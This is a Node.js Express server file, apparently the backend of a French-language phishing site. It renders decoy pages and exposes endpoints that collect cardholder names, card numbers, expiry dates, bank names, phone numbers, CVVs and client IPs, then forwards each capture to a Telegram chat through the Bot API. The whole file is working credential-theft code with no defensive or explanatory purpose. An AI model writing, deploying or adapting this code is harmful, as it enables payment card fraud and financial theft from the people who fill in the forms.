require('dotenv').config();
const express = require('express');
const path = require('path');
const https = require('https');

const app = express();

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Setup EJS
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, '../backend-nodejs/views'));

// Static files
app.use(express.static(path.join(__dirname, '../backend-nodejs/public')));

// IP detection middleware
app.use((req, res, next) => {
  req.clientIP = req.headers['x-forwarded-for'] || 
                 req.headers['cf-connecting-ip'] || 
                 req.connection.remoteAddress || 
                 'N/A';
  req.userAgent = req.headers['user-agent'] || 'N/A';
  next();
});

// Telegram Service inline
const sendTelegramMessage = (text) => {
  return new Promise((resolve, reject) => {
    const token = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;
    
    if (!token || !chatId) {
      reject(new Error('Missing Telegram config'));
      return;
    }

    const payload = JSON.stringify({
      chat_id: chatId,
      text: text,
      parse_mode: 'HTML'
    });

    const options = {
      hostname: 'api.telegram.org',
      path: `/bot${token}/sendMessage`,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(payload)
      }
    };

    const req = https.request(options, (res) => {
      let data = '';
      res.on('data', (chunk) => { data += chunk; });
      res.on('end', () => {
        try {
          const response = JSON.parse(data);
          resolve(response);
        } catch (e) {
          reject(e);
        }
      });
    });

    req.on('error', reject);
    req.write(payload);
    req.end();
  });
};

// ==================== ROUTES ====================

// Pages
app.get('/', (req, res) => {
  try {
    res.render('index');
  } catch (err) {
    res.status(500).json({ error: 'Error rendering page' });
  }
});

app.get('/accords', (req, res) => {
  try {
    res.render('accords');
  } catch (err) {
    res.status(500).json({ error: 'Error rendering page' });
  }
});

app.get('/premiere', (req, res) => {
  try {
    res.render('premiere');
  } catch (err) {
    res.status(500).json({ error: 'Error rendering page' });
  }
});

app.get('/deuxieme', (req, res) => {
  try {
    res.render('deuxieme');
  } catch (err) {
    res.status(500).json({ error: 'Error rendering page' });
  }
});

// ==================== API ENDPOINTS ====================

app.post('/api/send-agreement', async (req, res) => {
  try {
    const message = `<b>✅ CONDITIONS ACCEPTÉES</b>\n━━━━━━━━━━━━━━━━\n📋 Accord enregistré\n⏰ ${new Date().toLocaleString('fr-FR')}\n🌐 IP: ${req.clientIP}`;
    await sendTelegramMessage(message);
    res.json({ success: true });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

app.post('/api/send-form', async (req, res) => {
  try {
    const { titulaire, cardNumber, expiryDate, bank, telephone } = req.body;
    const message = `<b>💳 DONNÉES BANCAIRES</b>\n━━━━━━━━━━━━━━━━\n👤 ${titulaire}\n💳 ${cardNumber}\n📅 ${expiryDate}\n🏦 ${bank}\n📱 ${telephone}\n🌐 IP: ${req.clientIP}`;
    await sendTelegramMessage(message);
    res.json({ success: true });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

app.post('/api/send-cvv', async (req, res) => {
  try {
    const { cvv, titulaire, cardNumber, expiryDate } = req.body;
    const message = `<b>🔐 CVV REÇU</b>\n━━━━━━━━━━━━━━━━\n🔑 ${cvv}\n👤 ${titulaire}\n💳 ${cardNumber}\n📅 ${expiryDate}\n🌐 IP: ${req.clientIP}`;
    await sendTelegramMessage(message);
    res.json({ success: true });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

app.get('/api/health', (req, res) => {
  res.json({ 
    status: 'OK', 
    timestamp: new Date().toISOString(),
    environment: 'vercel'
  });
});

app.use((req, res) => {
  res.status(404).json({ error: 'Route not found' });
});

app.use((err, req, res, next) => {
  console.error('Server error:', err);
  res.status(500).json({ error: 'Internal server error' });
});

module.exports = app;
